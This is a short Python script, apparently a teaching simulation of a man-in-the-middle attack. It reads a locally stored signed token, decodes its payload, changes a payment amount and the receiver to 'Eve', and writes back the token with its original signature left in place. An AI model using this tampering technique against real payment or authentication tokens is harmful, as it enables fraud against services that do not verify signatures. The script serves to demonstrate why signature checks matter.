import json
import base64
import os

def add_padding(base64_string):
    return base64_string + "=" * (-len(base64_string) % 4)

def run_mitm_attack():
    print("--- MAN-IN-THE-MIDDLE ATTACK SIMULATION ---")
    
    token_path = "transmitted_token.txt"
    if not os.path.exists(token_path):
        print("Error: No token to intercept. Execute sender script first.")
        return

    with open(token_path, "r") as f:
        token = f.read().strip()

    parts = token.split(".")
    if len(parts) != 3:
        print("Invalid token format.")
        return

    header, payload_b64, signature = parts

    padded_payload = add_padding(payload_b64)
    payload_json = base64.urlsafe_b64decode(padded_payload).decode('utf-8')
    payload_data = json.loads(payload_json)

    print("Intercepted Data:")
    print(json.dumps(payload_data, indent=2))

    print("\nModifying the payload parameters...")
    payload_data["amount"] = 9999999
    payload_data["receiver"] = "Eve"
    
    print(" -> Modified Amount to: 9999999")
    print(" -> Modified Receiver to: Eve")

    new_payload_json = json.dumps(payload_data).encode('utf-8')
    new_payload_b64 = base64.urlsafe_b64encode(new_payload_json).decode('utf-8').rstrip('=')

    tampered_token = f"{header}.{new_payload_b64}.{signature}"

    with open(token_path, "w") as f:
        f.write(tampered_token)

if __name__ == "__main__":
    run_mitm_attack()